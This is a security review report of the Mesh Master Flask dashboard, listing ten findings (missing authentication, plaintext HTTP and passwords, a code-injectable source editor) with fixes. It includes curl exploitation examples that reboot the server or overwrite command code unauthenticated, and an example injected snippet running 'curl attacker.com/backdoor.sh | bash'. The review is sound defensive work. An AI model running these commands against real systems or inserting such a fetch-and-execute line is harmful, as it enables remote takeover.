# Mesh Master Security Review
**Date:** 2025-10-10
**Version:** 2.0
**Reviewer:** Claude Code Security Analysis

## Executive Summary

This security review identifies several **CRITICAL** and **HIGH** severity vulnerabilities in Mesh Master that require immediate attention. The application has good encryption practices for user data but lacks fundamental web security controls.

### Risk Level: **HIGH** ⚠️

---

## Critical Findings

### 1. **CRITICAL: No Authentication on Web Dashboard** ⛔
**Severity:** CRITICAL
**CVSS Score:** 9.8 (Critical)

**Issue:**
The Flask web dashboard (port 5000) is exposed on `0.0.0.0` (all interfaces) with **ZERO authentication**. All API endpoints are publicly accessible:

```python
# Line 28080
app.run(host="0.0.0.0", port=flask_port, debug=False)
```

**Vulnerable Endpoints:**
- `/dashboard/system/reboot` (POST) - Reboots the entire server, no auth
- `/dashboard/features` (POST) - Modifies AI settings, disables commands
- `/dashboard/commands/<command_id>` (PUT/DELETE) - Modifies/deletes commands
- `/dashboard/radio/*` (POST) - Changes radio configuration
- `/dashboard/admins/remove` (POST) - Removes admin users
- `/dashboard/config/update` (POST) - Updates configuration
- `/send` (POST) - Sends mesh messages
- All 30+ POST/PUT/DELETE endpoints have NO authentication

**Impact:**
- **Remote Code Execution:** Anyone can edit command source code via `/dashboard/commands/builtin/<command_name>/source` (line 26889)
- **System Compromise:** Reboot system, modify config, change radio settings
- **Data Manipulation:** Send messages, delete data, modify features
- **Privilege Escalation:** Remove admins, change admin passphrase

**Exploitation:**
```bash
# Anyone on the network can reboot your system:
curl -X POST http://192.168.1.x:5000/dashboard/system/reboot

# Anyone can modify Python command source code:
curl -X PUT http://192.168.1.x:5000/dashboard/commands/builtin/test/source \
  -H "Content-Type: application/json" \
  -d '{"source": "malicious python code here"}'
```

**Recommendation:**
1. **IMMEDIATE:** Add session-based authentication to all dashboard endpoints
2. Implement role-based access control (RBAC)
3. Require admin passphrase for all destructive operations
4. Add CSRF tokens to all forms
5. Consider binding dashboard to `127.0.0.1` only and use SSH tunneling for remote access

---

### 2. **CRITICAL: No HTTPS/TLS Encryption** 🔓
**Severity:** CRITICAL
**CVSS Score:** 7.4 (High)

**Issue:**
All web traffic is transmitted in plaintext HTTP. Admin passphrases, Telegram tokens, API keys, and configuration data are sent unencrypted.

**Impact:**
- Man-in-the-middle attacks can capture credentials
- Session hijacking possible
- Network sniffing reveals all dashboard activity
- Credentials transmitted in clear text

**Affected Data:**
- Admin passphrase (sent via POST to `/dashboard/features`)
- Telegram bot tokens (sent to `/dashboard/telegram/save`)
- Weather API keys
- Home Assistant tokens
- All configuration updates

**Recommendation:**
1. **IMMEDIATE:** Implement TLS/HTTPS with self-signed certificate minimum
2. Use Let's Encrypt for production deployments
3. Redirect all HTTP to HTTPS
4. Set secure cookie flags (Secure, HttpOnly, SameSite)

---

### 3. **HIGH: Weak Admin Password Storage** 🔑
**Severity:** HIGH
**CVSS Score:** 6.5 (Medium)

**Issue:**
Admin passwords are stored and compared in plaintext/casefold (line 3303-3304):

```python
ADMIN_PASSWORD = str(config.get("admin_password", "password") or "password")
ADMIN_PASSWORD_NORM = ADMIN_PASSWORD.strip().casefold()

# Line 9212 - plaintext comparison
if normalized and normalized == ADMIN_PASSWORD_NORM:
```

**Impact:**
- Password visible in `config.json` file
- Anyone with file access sees admin password
- No protection against offline attacks
- Default password is literally "password"

**Current Protection:**
- File permissions: `-rw-r--r--` (world-readable!)
- No hashing (unlike mail PINs which use bcrypt)

**Recommendation:**
1. **IMMEDIATE:** Hash admin passwords with bcrypt (like mail PINs)
2. Remove password from config.json, store hash in secure location
3. Change default password immediately
4. Implement password complexity requirements
5. Fix file permissions: `chmod 600 config.json`

---

### 4. **HIGH: Code Injection via Command Source Editor** 💉
**Severity:** HIGH
**CVSS Score:** 9.0 (Critical when combined with #1)

**Issue:**
Dashboard allows editing Python command source code (line 26889-26956). While it validates syntax, it allows arbitrary Python code execution:

```python
# Line 26942 - Only checks syntax, not safety
compile(new_source_content, '<string>', 'exec')

# Line 26954 - Auto-restarts service with new code
subprocess.Popen(['sudo', 'systemctl', 'restart', 'mesh-ai'])
```

**Impact:**
- **Remote Code Execution:** Inject malicious Python code
- **System Compromise:** Code runs as service user (likely with sudo)
- **Persistence:** Malicious code survives reboots
- **Privilege Escalation:** Can execute system commands

**Example Attack:**
```python
# Injected into command source via dashboard:
import subprocess
subprocess.run(['bash', '-c', 'curl attacker.com/backdoor.sh | bash'])
```

**Recommendation:**
1. **IMMEDIATE:** Require authentication (#1 fix)
2. Restrict command editing to whitelisted admins only
3. Add code sandboxing/validation beyond syntax check
4. Log all command source modifications
5. Require approval workflow for code changes
6. Consider making command source read-only in production

---

## High Findings

### 5. **HIGH: Insecure File Permissions** 📁
**Severity:** HIGH
**CVSS Score:** 5.5 (Medium)

**Issue:**
Sensitive configuration files are world-readable:

```bash
-rw-r--r-- config.json              # Contains passwords, API keys
-rw-r--r-- data/mail_security.json # Contains mailbox PINs, encryption keys
-rw-r--r-- data/telegram_config.json # Contains bot tokens
```

**Impact:**
- Any local user can read credentials
- Shared system security breach
- Passwords, tokens, and encryption keys exposed

**Recommendation:**
```bash
chmod 600 config.json
chmod 600 data/mail_security.json
chmod 600 data/telegram_config.json
chmod 600 data/saved_contexts.json
chown snailpi:snailpi data/*.json
```

---

### 6. **HIGH: No Rate Limiting** 🚦
**Severity:** MEDIUM
**CVSS Score:** 5.3 (Medium)

**Issue:**
No rate limiting on any API endpoints. Vulnerable to:
- Brute force attacks on admin passwords
- API abuse/DoS
- Resource exhaustion

**Recommendation:**
1. Implement rate limiting (Flask-Limiter)
2. Add exponential backoff for failed auth attempts
3. Log and alert on suspicious activity
4. Add IP-based throttling

---

### 7. **MEDIUM: Subprocess Shell Injection Risk** 🐚
**Severity:** MEDIUM
**CVSS Score:** 6.3 (Medium)

**Issue:**
Several subprocess calls use `shell=True` (line 1990) which can allow command injection if inputs aren't properly sanitized.

**Recommendation:**
1. Audit all subprocess calls with `shell=True`
2. Use list arguments instead of shell=True where possible
3. Validate and sanitize all user inputs
4. Use subprocess with array arguments: `subprocess.run(['cmd', 'arg'])`

---

## Medium Findings

### 8. **MEDIUM: No CSRF Protection** 🎭
**Severity:** MEDIUM
**CVSS Score:** 6.5 (Medium)

**Issue:**
No CSRF tokens on any POST/PUT/DELETE endpoints. When combined with no authentication, allows cross-site request forgery.

**Recommendation:**
1. Implement CSRF tokens (Flask-WTF)
2. Validate tokens on all state-changing operations
3. Use SameSite cookie attribute

---

### 9. **MEDIUM: Information Disclosure in Logs** 📋
**Severity:** LOW
**CVSS Score:** 3.3 (Low)

**Issue:**
While message content is redacted (good!), logs may still contain sensitive metadata:
- Node IDs and names
- Timing information
- Command patterns

**Recommendation:**
1. Review log retention policies
2. Secure log file permissions (`chmod 600 *.log`)
3. Consider log encryption for archived logs

---

### 10. **MEDIUM: No Input Validation on Config Updates** ✍️
**Severity:** MEDIUM
**CVSS Score:** 5.4 (Medium)

**Issue:**
Configuration endpoint accepts arbitrary JSON without comprehensive validation.

**Recommendation:**
1. Implement JSON schema validation
2. Whitelist allowed config keys
3. Validate value types and ranges
4. Reject unknown configuration keys

---

## Good Security Practices Found ✅

1. **✅ Excellent:** Chat context encryption with radio ID-based keys
2. **✅ Excellent:** Mail PIN protection with bcrypt hashing
3. **✅ Excellent:** Fernet encryption for mailbox content
4. **✅ Good:** Message content redaction in logs
5. **✅ Good:** URL content filtering (adult/warez sites)
6. **✅ Good:** Data gitignoring for sensitive files
7. **✅ Good:** No SQL injection vectors (no SQL database for user data)
8. **✅ Good:** Telegram bot token security (not logged)

---

## Immediate Action Items (Priority Order)

1. **[CRITICAL - Day 1]** Add authentication to all dashboard endpoints
2. **[CRITICAL - Day 1]** Implement HTTPS/TLS encryption
3. **[CRITICAL - Day 2]** Fix file permissions on config files (`chmod 600`)
4. **[HIGH - Week 1]** Implement bcrypt hashing for admin passwords
5. **[HIGH - Week 1]** Restrict command source editing to whitelisted admins
6. **[HIGH - Week 1]** Add rate limiting to all endpoints
7. **[MEDIUM - Week 2]** Implement CSRF protection
8. **[MEDIUM - Week 2]** Add input validation on config updates
9. **[MEDIUM - Week 2]** Audit subprocess calls for shell injection risks
10. **[LOW - Month 1]** Security audit of log files and retention

---

## Compliance & Standards

### OWASP Top 10 (2021) Violations

1. **A01:2021 - Broken Access Control** ⛔ (Critical #1)
2. **A02:2021 - Cryptographic Failures** ⛔ (Critical #2, #3)
3. **A03:2021 - Injection** ⚠️ (High #4, #7)
4. **A05:2021 - Security Misconfiguration** ⚠️ (High #5, #6)
5. **A07:2021 - Identification and Authentication Failures** ⛔ (Critical #3)

### CWE Coverage

- CWE-306: Missing Authentication for Critical Function
- CWE-319: Cleartext Transmission of Sensitive Information
- CWE-521: Weak Password Requirements
- CWE-94: Improper Control of Generation of Code
- CWE-732: Incorrect Permission Assignment for Critical Resource

---

## Security Testing Recommendations

1. **Penetration Testing:** Engage security professional for full pentest
2. **Automated Scanning:** Run OWASP ZAP or Burp Suite against dashboard
3. **Code Review:** Manual security code review of all API endpoints
4. **Dependency Audit:** Run `pip-audit` to check for vulnerable packages
5. **Network Scan:** Use nmap to verify exposed services

---

## Conclusion

Mesh Master has **excellent data encryption** (chat contexts, mail) but **critical web security gaps**. The primary risk is the **completely unauthenticated web dashboard** exposed to the network with remote code execution capabilities.

**Immediate Priority:** Add authentication and HTTPS before deploying to any network with untrusted users.

**Overall Security Maturity:** 🟡 MODERATE (Strong crypto, weak perimeter)

---

## Contact & Disclosure

For security issues, please report privately to the project maintainers before public disclosure.

**Generated by Claude Code Security Review**
**Date:** 2025-10-10
